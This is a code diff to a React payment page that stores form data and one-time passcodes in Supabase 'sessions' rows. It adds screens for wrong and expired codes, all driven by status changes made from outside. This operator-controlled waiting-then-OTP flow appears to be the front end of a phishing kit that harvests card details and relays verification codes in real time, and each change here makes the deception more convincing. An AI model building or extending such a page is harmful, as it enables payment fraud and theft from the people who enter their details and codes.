@@ -10,6 +10,7 @@ const Index = () => {
   const [step, setStep] = useState<"form" | "waiting" | "otp" | "processing" | "success" | "rejected">("form");
   const [amount, setAmount] = useState("");
   const [sessionId, setSessionId] = useState<string | null>(null);
+  const [otpError, setOtpError] = useState<string | null>(null);
 
   const parsedAmount = parseFloat(amount) || 0;
   const transactionFee = parsedAmount > 0 ? parseFloat((parsedAmount * 0.001).toFixed(2)) : 0;
@@ -20,13 +21,15 @@ const Index = () => {
   const formatEuro = (val: number) =>
     val.toLocaleString("en-IE", { style: "currency", currency: "EUR" });
 
+  const formattedTotal = isValidAmount ? formatEuro(total) : "€0.00";
+
   const handleFormSubmit = (id: string) => {
     setSessionId(id);
     setStep("waiting");
   };
 
   useEffect(() => {
-    if (!sessionId || (step !== "waiting" && step !== "processing")) return;
+    if (!sessionId || (step !== "waiting" && step !== "processing" && step !== "otp")) return;
 
     const channel = supabase
       .channel(`session-${sessionId}`)
@@ -41,12 +44,30 @@ const Index = () => {
         (payload) => {
           const newStatus = (payload.new as any).status;
           if (step === "waiting") {
-            if (newStatus === "otp") setStep("otp");
+            if (newStatus === "otp") { setOtpError(null); setStep("otp"); }
+            if (newStatus === "rejected") setStep("rejected");
+          }
+          if (step === "otp") {
+            if (newStatus === "otp_wrong") {
+              setOtpError("The verification code you entered is incorrect. Please try again.");
+              // Stay on OTP screen
+            }
+            if (newStatus === "otp_expired") {
+              setOtpError("This verification code has expired. Please request a new one.");
+            }
             if (newStatus === "rejected") setStep("rejected");
           }
           if (step === "processing") {
             if (newStatus === "success") setStep("success");
             if (newStatus === "rejected") setStep("rejected");
+            if (newStatus === "otp_wrong") {
+              setOtpError("The verification code you entered is incorrect. Please try again.");
+              setStep("otp");
+            }
+            if (newStatus === "otp_expired") {
+              setOtpError("This verification code has expired. Please request a new one.");
+              setStep("otp");
+            }
           }
         }
       )
@@ -58,6 +79,7 @@ const Index = () => {
   }, [sessionId, step]);
 
   const handleOtpSubmit = async (otp: string) => {
+    setOtpError(null);
     if (sessionId) {
       const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).single();
       const existingData = (data?.form_data as Record<string, any>) || {};
@@ -164,9 +186,9 @@ const Index = () => {
               onSuccess={handleFormSubmit}
             />
           )}
-          {step === "waiting" && <WaitingScreen />}
-          {step === "otp" && <OtpVerification onSubmit={handleOtpSubmit} />}
-          {step === "processing" && <WaitingScreen />}
+          {step === "waiting" && <WaitingScreen amount={formattedTotal} />}
+          {step === "otp" && <OtpVerification onSubmit={handleOtpSubmit} error={otpError} />}
+          {step === "processing" && <WaitingScreen amount={formattedTotal} />}
           {step === "success" && <PaymentSuccess amount={formatEuro(total)} />}
           {step === "rejected" && <PaymentRejected onRetry={() => { setStep("form"); setSessionId(null); }} />}
         </div>
